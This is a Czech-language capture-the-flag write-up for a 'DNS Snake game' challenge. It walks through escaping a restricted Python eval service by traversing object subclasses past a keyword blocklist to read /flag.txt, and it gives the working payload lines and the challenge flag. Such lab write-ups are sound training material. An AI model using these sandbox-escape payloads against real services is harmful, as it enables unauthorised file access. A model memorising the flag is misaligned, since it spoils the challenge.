# DNS Snake game (4)

## Zadání

Hi, TCC-CSIRT analyst,

snakes are wonderful creatures, and everyone loves them. Many people enjoy playing with snakes and find them fascinating companions. One on them lives on `snakegame.leisure.tcc` on port `23001/TCP`.

See you in the next incident!

## Nápovědy (Hints)

1. The snake is actually a python.

## Řešení

Po připojení k server ze zadání `nc snakegame.leisure.tcc 23001` dostaneme

```text
Hello, I can only speak Python, show me your code.
Enter your code :
```

Server zpracovává zadané příkazy, ale některé nejsou dovolené. Např. `open`, `exec`, `_eval`, `import`, `system` a další.

```text
This is not allowed: open
```

Po zadání `{}.__class__` dostaneme

```text
<class 'dict'>
```

Zjistíme seznam tříd, které jsou načtené a k dispozici

`{}.__class__.__mro__[-1].__subclasses__()`

```text
[<class 'type'>,
 <class 'async_generator'>,
 <class 'bytearray_iterator'>,
 <class 'bytearray'>,
 <class 'bytes_iterator'>,
 <class 'bytes'>,
 <class 'builtin_function_or_method'>,
...
```

Použijeme třídu `_io._IOBase` s indexem 114 pro čtení souborů.

Zjistíme metody třídy `_io._IOBase` pomocí `{}.__class__.__mro__[1].__subclasses__()[114].__subclasses__()`

```text
<class '_io._BufferedIOBase'>
<class '_io._RawIOBase'>
<class '_io._TextIOBase'>
<class 'io.IOBase'>
```

Použijeme funkci `_io._RawIOBase` a zkusíme přečíst soubor `flag.txt`.

`{}.__class__.__mro__[1].__subclasses__()[114].__subclasses__()[1].__subclasses__()[0]("flag.txt").read()`

`flag.txt` neexistuje. Tak zkusíme `/flag.txt`.

`{}.__class__.__mro__[1].__subclasses__()[114].__subclasses__()[1].__subclasses__()[0]("/flag.txt").read()`

Tady už server vrátí FLAG.

Tady je vyčtený python soubor [snake.py](snake.py), který zpracovává příkazy.

## Flag

`FLAG{lY4D-GJaQ-VUks-PNQd}`
